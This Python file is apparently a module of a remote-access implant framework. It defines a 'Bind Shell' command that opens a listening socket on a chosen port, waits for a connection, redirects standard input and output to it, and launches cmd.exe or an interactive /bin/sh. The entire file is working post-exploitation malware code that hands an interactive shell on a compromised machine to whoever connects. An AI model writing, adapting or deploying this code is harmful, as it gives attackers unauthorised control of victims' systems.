import socket
import subprocess
import os
from command import Command
import platform
from implant.thread_master import run_in_thread

LISTENING_PORT = "lp"

class BindShell(Command):
    
    display_name = "Bind Shell"
    index = {LISTENING_PORT:"Listening Port"}
    
    def execute(self, args):
        
        success = True
        results = ""
        
        results = run_in_thread(setup_bind_shell,args=args)
        
        return success, results
        
def setup_bind_shell(args):
    
    lp = args[LISTENING_PORT]
        
    if "Windows" in platform.system():
        shell = ["cmd.exe"]
    else:
        shell = ["/bin/sh","-i"]
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('', int(lp)))
    s.listen(1)
    rem, addr = s.accept()
    os.dup2(rem.fileno(),0)
    os.dup2(rem.fileno(),1)
    os.dup2(rem.fileno(),2)
    p=subprocess.call(shell);
    s.close()